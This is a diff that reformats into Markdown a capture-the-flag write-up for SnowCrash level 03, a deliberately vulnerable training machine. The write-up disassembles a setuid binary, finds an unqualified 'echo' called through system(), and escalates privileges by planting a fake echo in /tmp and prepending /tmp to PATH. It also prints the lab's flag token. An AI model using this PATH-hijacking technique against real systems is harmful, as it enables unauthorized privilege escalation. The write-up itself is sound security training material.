@@ -1,32 +1,36 @@
+# Level 03
 
-****************************************
-*               Level 03               *
-****************************************
-
-Description :
+## Description
 
 Ok, let's see what we have here :
 
+```
 level03@SnowCrash:~$ ls
 level03
+```
 
 Let's try to run it :
 
+```
 level03@SnowCrash:~$ ./level03
 Exploit me
+```
 
 Let's see its permissions :
 
+```
 level03@SnowCrash:~$ ls -la level03
 
 -rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
+```
 
 Ok, so this is a binary that runs with the privileges of the file's current owner = 's' flag (here, interestingly the owner is the user "flag03")
 
-Interesting... so maybe we need to reverse-engineer it... 
+Interesting... so maybe we need to reverse-engineer it...
 
 Let's use gdb to do that :
 
+```
 level03@SnowCrash:~$ gdb ./level03
 (gdb) disas main
 
@@ -57,9 +61,11 @@ level03@SnowCrash:~$ gdb ./level03
 0x080484fe <+90>:    call   0x80483b0 <system@plt>
 0x08048503 <+95>:    leave  
 0x08048504 <+96>:    ret  
+```
 
 This is equivalent to something like this in C :
 
+```c
 #include <unistd.h>
 #include <stdlib.h>
 #include <sys/types.h>
@@ -78,12 +84,15 @@ int main(int argc, char **argv, char **envp)
 
     return (system("/usr/bin/env echo Exploit me"));  
 }
+```
 
-Note :
+**Note :**
 
+```
 RGID (Real Group ID) = The group of the user who started the process (the program execution)
 EGID (Effective Group ID) = The group whose permissions are currently used for access checks. Here the EUID becomes the owner of the file because the binary is "setuid", as we saw above, so geteuid() returns the UID of the privileged account that owns the binary (flag03 that can run the getflag).
 SGID (Saved Group ID) = A stored copy of a privileged group ID that allows the process to regain that group later.
+```
 
 So, how can we take advantage of this program ?
 
@@ -98,12 +107,15 @@ This means that if we :
 
 so everytime we run the "./level03" program, we become an elevated user and run the "/bin/getflag" as an evelated user, so we can get the flag to the next level without needing to first log in to the account "flag03" to have the rights to run "getflag" :
 
+```
 level03@SnowCrash:~$ echo "/bin/getflag" > /tmp/echo
 level03@SnowCrash:~$ chmod +x /tmp/echo
 level03@SnowCrash:~$ export PATH=/tmp:$PATH
+```
 
-export PATH=/tmp:$PATH puts/appends "/tmp" at the front of the PATH string, so if PATH was /usr/local/bin:/usr/bin:/bin, after the export it becomes: /tmp:/usr/local/bin:/usr/bin:/bin. The shell searches PATH left to right and stops at the first match.
+`export PATH=/tmp:$PATH` puts/appends "/tmp" at the front of the PATH string, so if PATH was `/usr/local/bin:/usr/bin:/bin`, after the export it becomes: `/tmp:/usr/local/bin:/usr/bin:/bin`. The shell searches PATH left to right and stops at the first match.
 
+```
 level03@SnowCrash:~$ ./level03
 Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
 
@@ -111,3 +123,4 @@ level03@SnowCrash:~$ su level04
 Password: qi0maab88jeaj46qoumi7maus
 
 level04@SnowCrash:~$
+```
